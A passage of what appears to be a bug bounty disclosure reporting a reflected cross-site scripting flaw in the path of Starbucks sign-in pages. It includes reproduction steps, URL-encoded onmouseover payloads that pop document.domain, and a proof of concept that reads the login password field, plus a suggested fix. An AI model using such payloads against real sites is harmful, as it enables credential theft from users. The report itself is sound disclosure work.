An attacker can actually control the relative path: \n\n{F839656}\n\nFurthermore, the application does not escape certain characters –  allowing us to break out of the tags and inject a malicious event handler.\n\n**Platform(s) Affected:** \n- https://www.starbucks.com/account/signin\n- https://www.starbucks.co.uk/account/signin\n\n## Steps To Reproduce:\n\n  1. Open Chrome or Firefox\n  2. Visit `https://www.starbucks.com/account/(A(%22%20%252fonmouseover=%22alert%25%32%38%64%6f%63%75%6d%65%6e%74.%64%6f%6d%61%69%6e%25%32%39%22))/signin` and in the upper right-hand corner, move your mouse over the \"Find the Store\" button.\n\nThe XSS will trigger and you'll get an `alert()` with the value of `document.domain`\n\n{F839657}\n\n\n## Exploitation: \nSince this is on the **login page**, it is absolutely trivial to steal user credentials.\n\nHere's a simple proof-of-concept, this will just alert() your password back to you:\n\n- `https://www.starbucks.com/account/(F(%22%20%252fonmouseover=%22%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e%2567%2565%2574%2545%256c%2565%256d%2565%256e%2574%2573%2542%2579%254e%2561%256d%2565%2528%2527%2541%2563%2563%256f%2575%256e%2574%252e%2550%2561%2573%2573%2557%256f%2572%2564%2527%2529%255b%2530%255d%252e%2576%2561%256c%2575%2565%2529%22))/signin`\n\n{F839660}\n\n\n## How can the system be exploited with this bug?\n  An attacker can easily abuse this bug to steal user passwords, inject malicious javascript into the context of `www.starbucks.com`, etc.\n\n## Suggested Mitigation\nImplement HTML encoding / escaping on the path.\n\n## Impact\n\nThis is a high impact vulnerability as this affects the login page.\n\nBest,\n@cdl","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":60,"name":"Cross-site Scripting (XSS) -
